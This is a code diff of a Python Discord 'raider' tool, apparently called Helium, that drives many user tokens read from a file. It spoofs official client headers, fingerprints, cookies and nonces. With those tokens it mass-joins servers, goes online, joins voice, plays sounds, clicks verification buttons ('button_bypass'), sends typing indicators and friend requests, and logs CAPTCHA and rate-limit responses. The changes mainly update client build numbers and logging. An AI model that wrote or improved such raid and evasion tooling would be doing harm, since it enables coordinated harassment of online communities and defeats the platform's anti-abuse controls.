@@ -87,8 +87,8 @@ class Files:
         try:
             if not os.path.exists("config.json"):
                 data = {
-                    "proxies": False,
-                    "color" : "light_blue"
+                    "Proxies": False,
+                    "Color": "light_blue",
                 }
                 with open("config.json", "w") as f:
                     json.dump(data, f, indent=4)
@@ -139,8 +139,8 @@ with open("config.json") as f:
 with open("data/tokens.txt", "r") as f:
     tokens = f.read().splitlines()
 
-proxy = config["proxies"]
-color = config["color"]
+proxy = config["Proxies"]
+color = config["Color"]
 
 if proxy:
     session.proxies = {
@@ -157,11 +157,8 @@ class Render:
             self.background = C[color]
 
     def render_ascii(self):
-        with open("data/tokens.txt", "r") as f:
-            tokens = f.read().splitlines()
         os.system('cls')
         os.system(f"title Helium - Connected as {os.getlogin()}")
-
         edges = ["╗", "║", "╚", "╝", "═", "╔"]
         title = f"""
 {'██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
@@ -436,7 +433,6 @@ class Raider:
     def __init__(self):
         self.cookies = self.get_discord_cookies()
         self.props = self.super_properties()
-        self.non = self.nonce()
         self.ws = websocket.WebSocket()
 
     def get_discord_cookies(self):
@@ -450,7 +446,7 @@ class Raider:
                 case _:
                     return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
         except Exception as e:
-            print(f"(ERR): {e} (get_discord_cookies)")
+            console.log(C["red"], "(ERR)", e, "(get_discord_cookies)")
 
     def super_properties(self):
         try:
@@ -458,22 +454,19 @@ class Raider:
                 "os": "Windows",
                 "browser": "Discord Client",
                 "release_channel": "stable",
-                "client_version": "1.0.9027",
+                "client_version": "1.0.9028",
                 "os_version": "10.0.19045",
                 "system_locale": "en",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9027 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                 "browser_version": "22.3.26",
-                "client_build_number": 254888,
-                "native_build_number": 41465,
+                "client_build_number": 256231,
+                "native_build_number": 41936,
                 "client_event_source": None,
             }
             properties = base64.b64encode(json.dumps(payload).encode()).decode()
             return properties
         except Exception as e:
-            print(f"(ERR): {e} (get_super_properties)")
-
-    def nonce(self):
-        return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)
+            console.log(C["red"], "(ERR)", e, "(get_super_properties)")
 
     def headers(self, token):
         return {
@@ -483,12 +476,15 @@ class Raider:
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9027 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
             "x-discord-locale": "en-US",
             'x-debug-options': 'bugReporterEnabled',
             "x-super-properties": self.props,
         }
     
+    def nonce(self):
+        return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)
+
     def joiner(self, token, invite):
         try:
             payload = {
@@ -583,7 +579,7 @@ class Raider:
                         "self_deaf": False
                     }
                 }))
-                print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.LIGHTCYAN_EX}Joined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                console.log(C["light_blue"], "Joined", f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -603,7 +599,7 @@ class Raider:
                     }
                 )
             )
-            print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Onlined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+            console.log(C["light_blue"], "Onlined", f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -983,13 +979,13 @@ class Raider:
 
                 match response.status_code:
                     case 204:
-                        print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}]{Fore.LIGHTCYAN_EX} Successfully played sound {Fore.YELLOW}{name} {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                        console.log(C["light_blue"], f"Successfully played sound {Fore.YELLOW}{name}", f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                     case 429:
                         retry_after = response.json().get("retry_after")
                         console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                         time.sleep(float(retry_after))
                     case _:
-                        print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RED}Failed to play sound {Fore.YELLOW}{name} {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                 time.sleep(random.uniform(0.56, 0.75))
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
@@ -1064,17 +1060,17 @@ class Raider:
     def button_bypass(self, token, message_id, channel_id, guild_id, optionbutton):
         try:
             payload = {
-                "limit": "50",
-                "around": message_id,
+                'limit': '50',
+                'around': message_id,
             }
 
-            response1 = session.get(
+            response = session.get(
                 f'https://canary.discord.com/api/v9/channels/{channel_id}/messages',
                 params=payload,
                 headers=self.headers(token)
             )
 
-            messages = response1.json()
+            messages = response.json()
             messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
 
             if messagebottoclick is None:
@@ -1086,31 +1082,31 @@ class Raider:
                 buttons.append(x["components"][0])
 
             data = {
-                "type": 3,
-                "guild_id": guild_id,
-                "channel_id": channel_id,
-                "message_flags": 0,
-                "message_id": message_id,
-                "application_id": messagebottoclick["author"]["id"],
-                "nonce": self.nonce(),
-                "session_id": uuid.uuid4().hex,
-                "data": {
-                    "component_type": 2,
-                    "custom_id": buttons[int(optionbutton)]["custom_id"],
+                'application_id': messagebottoclick["author"]["id"],
+                'channel_id': channel_id,
+                'data': {
+                    'component_type': 2,
+                    'custom_id': buttons[int(optionbutton)]["custom_id"],
                 },
+                'guild_id': guild_id,
+                'message_flags': 0,
+                'message_id': message_id,
+                'nonce': self.nonce(),
+                'session_id': uuid.uuid4().hex,
+                'type': 3,
             }
 
-            response2 = session.post(
+            respons = session.post(
                 'https://canary.discord.com/api/v9/interactions',
                 headers=self.headers(token),
                 json=data
             )
 
-            match response2.status_code:
-                case 200:
-                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.RESET} {token[:25]}.{Fore.LIGHTCYAN_EX}**")
+            match respons.status_code:
+                case 204:
+                    console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                 case _:
-                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.RED}Failed{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", respons.json().get("message"))
         except Exception as e:
             console.log("FAILED", C["red"], "Failed to Click Button", e)
 
@@ -1228,7 +1224,7 @@ class Raider:
 
                 match response.status_code:
                     case 200:
-                        print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.LIGHTCYAN_EX}Success{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                        console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                         break
                     case 429:
                         retry_after = response.json().get("retry_after")
@@ -1279,7 +1275,7 @@ class Raider:
 
                 match response.status_code: 
                     case 204:
-                        print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET}    {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}]   {Fore.LIGHTBLACK_EX}->   {Fore.RESET}Typing {Fore.CYAN}{token[:25]}{Fore.LIGHTBLACK_EX}****{Fore.RESET}")
+                        console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                         time.sleep(9)
                     case 429:
                         retry_after = response.json().get("retry_after")
@@ -1306,7 +1302,7 @@ class Raider:
 
             match response.status_code:
                 case 204:
-                    print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET} {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Sent friend {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                    console.log(f"SUCCESS -> added {nickname}", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                 case 400:
                     console.log("CAPTCHA", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
                 case _:
@@ -1376,12 +1372,7 @@ class Raider:
                     case 200:
                         console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                     case _:
-                        console.log(
-                            "FAILED",
-                            C["red"],
-                            f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**",
-                            response.json().get("message"),
-                        )
+                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
             except Exception as e:
                 console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
